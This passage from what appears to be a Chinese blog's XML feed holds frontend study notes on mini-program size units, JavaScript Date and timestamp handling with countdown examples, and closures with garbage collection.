0.5px</td><td style="text-align:left">1px = 2rpx</td></tr><tr><td style="text-align:left">iPhone6 Plus</td><td style="text-align:left">1rpx = 0.552px</td><td style="text-align:left">1px = 1.81rpx</td></tr></tbody></table><ul><li><p>rpx（responsive pixel）: 可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。 </p></li><li><p>建议小程序的设计稿以750 x 1334 的物理分辨率进行设计</p></li><li><p>pt: html css中的使用的单位像素px: 实际上指的是逻辑像素pt</p></li><li><p>px: photoshop测量中的但是实际上指的是物理像素, 物理像素即表示的是一个点, 大小固定</p></li><li><p>一个pt可以包含多个物理像素px，在iphone6中一个单位的逻辑像素包含2个物理像素iphone的分辨率为375*667 实际上指的是逻辑像素为375*667, 所以一般移动端的设计图纸一般是给的是750*1334,  是因为一个逻辑像素pt包含两个物理像素px</p></li></ul><h3 id="5-vw-vh"><a href="#5-vw-vh" class="headerlink" title="5.vw,vh"></a>5.vw,vh</h3><ul><li>vw和vh是css3中的新单位，是一种视窗单位，在小程序中也同样适用。</li><li>小程序中，窗口宽度固定为100vw，将窗口宽度平均分成100份，1份是1vw</li><li>小程序中，窗口高度固定为100vh ，将窗口高度平均分成100份，1份是1vh</li><li>所以，我们在小程序中也可以使用vw、vh作为尺寸单位使用在布局中进行布局，但是一般情况下，百分比+rpx就已经足够使用了,所以它们的出场机会很少。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>关于日期对象</title>
      <link href="2018/08/30/%E6%95%B4%E7%90%86-%E5%85%B3%E4%BA%8E%E6%97%A5%E6%9C%9F%E5%AF%B9%E8%B1%A1/"/>
      <url>2018/08/30/%E6%95%B4%E7%90%86-%E5%85%B3%E4%BA%8E%E6%97%A5%E6%9C%9F%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<ul><li>日期对象</li><li>关于时间戳处理</li><li>Date.parse（）</li></ul><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();<span class="comment">//返回时间；</span></span><br><span class="line">      <span class="keyword">var</span> YY = date.getFullYear(); <span class="comment">//返回年</span></span><br><span class="line">      <span class="keyword">var</span> MM = date.getMonth() + <span class="number">1</span>  ;<span class="comment">//返回月</span></span><br><span class="line">      <span class="keyword">var</span> Day = date.getDay();<span class="comment">//返回星期 【注意 ：每个星期第一天是星期日】</span></span><br><span class="line">      <span class="keyword">var</span> DD = date.getDate();<span class="comment">//返回天 </span></span><br><span class="line">      <span class="keyword">var</span> hh = date.getHours(); <span class="comment">//返回时</span></span><br><span class="line">      <span class="keyword">var</span> mm = date.getMinutes();<span class="comment">//返回分</span></span><br><span class="line">      <span class="keyword">var</span> ss = date.getSeconds();<span class="comment">//返回秒</span></span><br><span class="line">      <span class="keyword">var</span> ms = date.getMilliseconds();<span class="comment">//返回秒</span></span><br><span class="line">      <span class="keyword">var</span> Time = date.getTime();<span class="comment">//返回 1970 年 1 月 1 日至今的毫秒数 </span></span><br><span class="line">      <span class="keyword">var</span> Now = <span class="built_in">Date</span>.now(); <span class="comment">//返回 1970 年 1 月 1 日至今的毫秒数  【不兼容IE】</span></span><br><span class="line">      <span class="keyword">var</span> a = date.toLocaleString() <span class="comment">//返回年月日，时分秒；</span></span><br><span class="line">      <span class="keyword">var</span> b = date.toLocaleDateString(); <span class="comment">//返回年月日</span></span><br><span class="line">      <span class="keyword">var</span> c = date.toLocaleTimeString(); <span class="comment">//返回时分秒</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>(); <span class="comment">//返回指定的时间 【注意：月份会加1，所以我们设置的时候要减1】</span></span><br><span class="line"><span class="keyword">var</span> date1 = <span class="keyword">new</span> <span class="built_in">Date</span>( <span class="string">'2018/8/20'</span> );</span><br><span class="line"><span class="keyword">var</span> date2 = <span class="keyword">new</span> <span class="built_in">Date</span>( <span class="number">2018</span>,<span class="number">7</span> );</span><br><span class="line"><span class="keyword">var</span> date3 = <span class="keyword">new</span> <span class="built_in">Date</span>( <span class="number">2018</span> );</span><br><span class="line"><span class="keyword">var</span> date4 = <span class="keyword">new</span> <span class="built_in">Date</span>( <span class="string">'9'</span> );</span><br><span class="line"><span class="built_in">console</span>.log( date ) <span class="comment">//当前时间</span></span><br><span class="line"><span class="built_in">console</span>.log( date1 )<span class="comment">//Mon Aug 20 2018 00:00:00</span></span><br><span class="line"><span class="built_in">console</span>.log( date2 )<span class="comment">//Wed Aug 01 2018 00:00:00</span></span><br><span class="line"><span class="built_in">console</span>.log( date3 )<span class="comment">//Thu Jan 01 1970 08:00:02</span></span><br><span class="line"><span class="built_in">console</span>.log( date4 )<span class="comment">//Sat Sep 01 2001 00:00:00</span></span><br><span class="line"><span class="comment">//getTimezoneOffset() 世界时（东八区） - 本地时间（ 当前的时间 ）</span></span><br><span class="line"><span class="built_in">console</span>.log( date.getTimezoneOffset() ) <span class="comment">//480/8 60分钟</span></span><br></pre></td></tr></table></figure><h2 id="案例一：输出北京时间"><a href="#案例一：输出北京时间" class="headerlink" title="案例一：输出北京时间"></a>案例一：输出北京时间</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">现在是北京时间：</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> box = <span class="built_in">document</span>.getElementById(<span class="string">'box'</span>),</span></span><br><span class="line"><span class="javascript">p = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'p'</span>)[<span class="number">0</span>],</span></span><br><span class="line"><span class="javascript">arr = [<span class="string">'星期日'</span>,<span class="string">'星期一'</span>,<span class="string">'星期二'</span>,<span class="string">'星期三'</span>,<span class="string">'星期四'</span>,<span class="string">'星期五'</span>,<span class="string">'星期六'</span>];</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();<span class="comment">//返回时间；</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> YY = date.getFullYear(); <span class="comment">//返回年</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> MM = date.getMonth() + <span class="number">1</span>  ;<span class="comment">//返回月</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> Day = date.getDay();<span class="comment">//返回星期 【注意 ：每个星期第一天是星期日】</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> DD = date.getDate();<span class="comment">//返回天 </span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> hh = addZero(date.getHours()); <span class="comment">//返回时</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> mm = addZero(date.getMinutes());<span class="comment">//返回分</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> ss = addZero(date.getSeconds());<span class="comment">//返回秒</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> str = YY+<span class="string">'年'</span>+MM+<span class="string">'月'</span>+DD+<span class="string">'日'</span>+arr[Day]+<span class="string">':'</span>+hh+<span class="string">'时'</span>+mm+<span class="string">'分'</span>+ss+<span class="string">'秒'</span>;</span></span><br><span class="line"><span class="undefined">            p.innerHTML = str;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        fn();<span class="comment">//先执行一次，避免出现延迟加载</span></span></span><br><span class="line"><span class="undefined">        setInterval(fn,1000);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">addZero</span>(<span class="params">n</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> n &lt; <span class="number">10</span> ? <span class="string">'0'</span> + n : n;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="案例二：距离过年时间"><a href="#案例二：距离过年时间" class="headerlink" title="案例二：距离过年时间"></a>案例二：距离过年时间</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>距离过年还有：</span><br><span class="line">       <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">       <span class="keyword">var</span> newYear = <span class="keyword">new</span> <span class="built_in">Date</span>( <span class="string">'2019/2/5'</span> ),</span></span><br><span class="line"><span class="javascript">       p = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'p'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">       <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">           <span class="keyword">var</span> date = newYear - <span class="built_in">Date</span>.now(),<span class="comment">//返回毫秒为距离明年过年要多少毫秒;</span></span></span><br><span class="line"><span class="javascript">               DD = <span class="built_in">Math</span>.floor(date/<span class="number">1000</span>/<span class="number">60</span>/<span class="number">60</span>/<span class="number">24</span>), <span class="comment">//返回天</span></span></span><br><span class="line"><span class="javascript">               hh = <span class="built_in">Math</span>.floor(date/<span class="number">1000</span>/<span class="number">60</span>/<span class="number">60</span>)%<span class="number">24</span>,</span></span><br><span class="line"><span class="javascript">               mm = <span class="built_in">Math</span>.floor(date/<span class="number">1000</span>/<span class="number">60</span>)%<span class="number">60</span>,</span></span><br><span class="line"><span class="javascript">               ss = <span class="built_in">Math</span>.floor(date/<span class="number">1000</span>)%<span class="number">60</span>;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">console</span>.log( DD ,hh,mm, ss)</span></span><br><span class="line"><span class="javascript">           <span class="keyword">var</span> str =  DD +<span class="string">'日'</span>+<span class="string">':'</span>+hh+<span class="string">'时'</span>+mm+<span class="string">'分'</span>+ss+<span class="string">'秒'</span>;</span></span><br><span class="line"><span class="undefined">           p.innerHTML = str;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">       fn()</span></span><br><span class="line"><span class="undefined">       setInterval( fn ,1000 )</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="关于时间戳处理"><a href="#关于时间戳处理" class="headerlink" title="关于时间戳处理"></a>关于时间戳处理</h2><p>在前后端接口开发时，时间对象的处理往往处理成13位的时间戳形式。</p><p>一般时间选择器拿到的都是<code>Thu Jul 04 2019 23:59:59 GMT+0800 (中国标准时间)</code>即日期对象的格式</p><ul><li>时间对象转换为时间戳</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个时间对象 dt，然后依次演示各种将 dt 转换为时间戳的写法</span></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">"2019-07-04 23:59:59.999"</span>);</span><br><span class="line"><span class="comment">// Thu Jul 04 2019 23:59:59 GMT+0800 (中国标准时间)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法一，精确到毫秒，得到 13 位时间戳 1562255999999</span></span><br><span class="line"><span class="built_in">console</span>.log(dt.getTime());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二，精确到毫秒，得到 13 位时间戳 1562255999999</span></span><br><span class="line"><span class="built_in">console</span>.log(dt.valueOf());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三，精确到毫秒，得到 13 位时间戳 1562255999999</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Number</span>(dt));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法四，精确到毫秒，得到 13 位时间戳 1562255999999</span></span><br><span class="line"><span class="built_in">console</span>.log(+dt);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法五，精确到秒，得到 13 位时间戳 1562255999000，后三位固定为 000</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Date</span>.parse(dt));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 但是如果这样写，还是可以的</span></span><br><span class="line"><span class="built_in">Date</span>.parse(<span class="string">"2019-07-04 23:59:59.999"</span>)</span><br><span class="line"><span class="comment">// 1562255999999</span></span><br></pre></td></tr></table></figure><ul><li>时间戳转换为时间对象</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意：参数中的时间戳必须是 13 位的，多一位或少一位都不行</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">1562169599000</span>); <span class="comment">// Wed Jul 03 2019 23:59:59 GMT+0800 (中国标准时间)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将时间戳转换为更加直观形象的本地时间</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">1562169599000</span>).toLocaleString() <span class="comment">// "2019/7/3 下午11:59:59"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断两个时间差是否超过一天</span></span><br><span class="line">(<span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-08-06 21:33:00'</span>)) - <span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-08-05 21:33:00'</span>)))</span><br><span class="line">/<span class="number">1000</span>/<span class="number">3600</span>/<span class="number">24</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 后三位是精确到毫秒，一般不用考虑</span></span><br><span class="line">+<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">"2019-07-04 23:59:59.999"</span>)</span><br><span class="line"><span class="comment">// 1562255999999</span></span><br><span class="line"></span><br><span class="line">+<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">"2019-07-04 23:59:59"</span>)</span><br><span class="line"><span class="comment">// 1562255999000</span></span><br></pre></td></tr></table></figure><h2 id="一个兼容性问题"><a href="#一个兼容性问题" class="headerlink" title="一个兼容性问题"></a>一个兼容性问题</h2><blockquote><p>时间格式为2020-08-09具有兼容性问题，正确用法是 new Date(‘2020/08/-09 21:33:00’)</p></blockquote><p><code>str.replace(/-/g,&quot;/&quot;)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2020-08-06 21:33:00'</span>)) - <span class="built_in">Date</span>.parse(<span class="keyword">new</span> <span class="built_in">Date</span>((<span class="string">'2020-08-05 21:33:00'</span>).replace(<span class="regexp">/-/g</span>,<span class="string">"/"</span>))))/<span class="number">1000</span>/<span class="number">3600</span>/<span class="number">24</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="一个函数"><a href="#一个函数" class="headerlink" title="一个函数"></a>一个函数</h2><ul><li>选择日期：比如说选择日期<code>10.23-10.24</code>，组件返回的是<code>23号0点到24号零点</code>，所以需要加一天时间</li><li>但是如果组件是精确到秒的话直接用<code>getTime</code>就行了</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">disposeTime(start, end) &#123;</span><br><span class="line">          <span class="keyword">let</span> startDate, endDate</span><br><span class="line">          <span class="keyword">if</span> (start.getTime) &#123;</span><br><span class="line">              startDate = start.getTime()</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              startDate = moment(start).valueOf()</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (end.getTime) &#123;</span><br><span class="line">              endDate = end.getTime()</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              endDate = moment(end).valueOf()</span><br><span class="line">          &#125;</span><br><span class="line">          endDate += <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span> - <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">              startDate,</span><br><span class="line">              endDate</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure><ul><li>其中的<code>moment</code>是一个时间格式化的插件</li><li>可以参考：<a href="https://blog.csdn.net/fu983531588/article/details/89330929" target="_blank" rel="noopener">Vue使用Moment插件格式化时间</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>闭包</title>
      <link href="2018/08/16/%E6%95%B4%E7%90%86-%E9%97%AD%E5%8C%85/"/>
      <url>2018/08/16/%E6%95%B4%E7%90%86-%E9%97%AD%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><ul><li>犀牛书：函数体内部的变量都可以保存在函数作用域内，这种特性称为闭包。</li><li>W3C和菜鸟教程：JavaScript 变量可以是局部变量或全局变量。私有变量可以用到闭包。</li><li>转载的这篇博客：闭包是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量</li></ul><a id="more"></a><h3 id="首先来看一段代码"><a href="#首先来看一段代码" class="headerlink" title="首先来看一段代码"></a>首先来看一段代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oLi = <span class="built_in">document</span>.querySelectorAll(<span class="string">'ul li'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,iL = oLi.length;i &lt; iL;i++)&#123;</span><br><span class="line"> <span class="comment">//自执行函数</span></span><br><span class="line">    ;(<span class="function"><span class="keyword">function</span>(<span class="params">thatIDom,thatI</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> n = <span class="number">0</span>;</span><br><span class="line">        thatIDom.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(thatI);</span><br><span class="line">               <span class="comment">//加入逻辑判断，触发回收机制</span></span><br><span class="line">        <span class="keyword">if</span>(n &gt; <span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="comment">//解除引用</span></span><br><span class="line">        thatIDom.onclick = <span class="literal">null</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)(oLi[i],i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果（每个li最多点击4次）"><a href="#运行结果（每个li最多点击4次）" class="headerlink" title="运行结果（每个li最多点击4次）"></a>运行结果（每个li最多点击4次）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">thatIDom.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(thatI);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//形成闭包。</span></span><br></pre></td></tr></table></figure><h2 id="闭包的定义-1"><a href="#闭包的定义-1" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><ul><li>犀牛书：函数体内部的变量都可以保存在函数作用域内，这种特性称为闭包。</li><li>W3C和菜鸟教程：JavaScript 变量可以是局部变量或全局变量。私有变量可以用到闭包。</li><li>转载的这篇博客：闭包是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量</li></ul><h2 id="闭包有三个特性："><a href="#闭包有三个特性：" class="headerlink" title="闭包有三个特性："></a>闭包有三个特性：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.函数嵌套函数</span><br><span class="line">2.函数内部可以引用外部的参数和变量</span><br><span class="line">3.参数和变量不会被垃圾回收机制回收</span><br></pre></td></tr></table></figure><h2 id="闭包的定义及其优缺点"><a href="#闭包的定义及其优缺点" class="headerlink" title="闭包的定义及其优缺点"></a>闭包的定义及其优缺点</h2><p><code>闭包</code> 是指有权访问另一个函数作用域中的变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量</p><p>闭包的缺点就是常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。</p><p>闭包是<code>javascript</code>语言的一大特点，主要应用闭包场合主要是为了：设计私有的方法和变量。</p><p>一般函数执行完毕后，局部活动对象就被销毁，内存中仅仅保存全局作用域。但闭包的情况不同！</p><h2 id="嵌套函数的闭包"><a href="#嵌套函数的闭包" class="headerlink" title="嵌套函数的闭包"></a>嵌套函数的闭包</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">       <span class="keyword">var</span> a = <span class="number">1</span>;  </span><br><span class="line">       <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(a++)</span><br><span class="line">       &#125;;  </span><br><span class="line">     &#125;         </span><br><span class="line">     <span class="keyword">var</span> fun = aaa();  </span><br><span class="line">     fun();<span class="comment">// 1 执行后 a++，，然后a还在~  </span></span><br><span class="line">     fun();<span class="comment">// 2   </span></span><br><span class="line">     fun = <span class="literal">null</span>;<span class="comment">//a被回收！！</span></span><br></pre></td></tr></table></figure><p>闭包会使变量始终保存在内存中，如果不当使用会增大内存消耗。</p><h2 id="javascript的垃圾回收原理"><a href="#javascript的垃圾回收原理" class="headerlink" title="javascript的垃圾回收原理"></a><code>javascript</code>的垃圾回收原理</h2><p>（1）、在<code>javascript</code>中，如果一个对象不再被引用，那么这个对象就会被<code>GC</code>回收；<br>（2）、如果两个对象互相引用，而不再被第<code>3</code>者所引用，那么这两个互相引用的对象也会被回收。</p><h2 id="使用闭包的好处"><a href="#使用闭包的好处" class="headerlink" title="使用闭包的好处"></a>使用闭包的好处</h2><p>那么使用闭包有什么好处呢？使用闭包的好处是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.希望一个变量长期驻扎在内存中</span><br><span class="line">2.避免全局变量的污染</span><br><span class="line">3.私有成员的存在</span><br></pre></td></tr></table></figure><h2 id="一、全局变量的累加"><a href="#一、全局变量的累加" class="headerlink" title="一、全局变量的累加"></a>一、全局变量的累加</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="number">1</span>;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">        a++;</span></span><br><span class="line"><span class="undefined">        alert(a);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">abc();              <span class="comment">//2</span></span></span><br><span class="line"><span class="javascript">abc();            <span class="comment">//3</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二、局部变量"><a href="#二、局部变量" class="headerlink" title="二、局部变量"></a>二、局部变量</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">abc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = <span class="number">1</span>;</span></span><br><span class="line"><span class="undefined">        a++;</span></span><br><span class="line"><span class="undefined">        alert(a);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript">abc();                       <span class="comment">//2</span></span></span><br><span class="line"><span class="javascript">abc();                    <span class="comment">//2</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么怎么才能做到变量a既是局部变量又可以累加呢？</p><h2 id="三、局部变量的累加"><a href="#三、局部变量的累加" 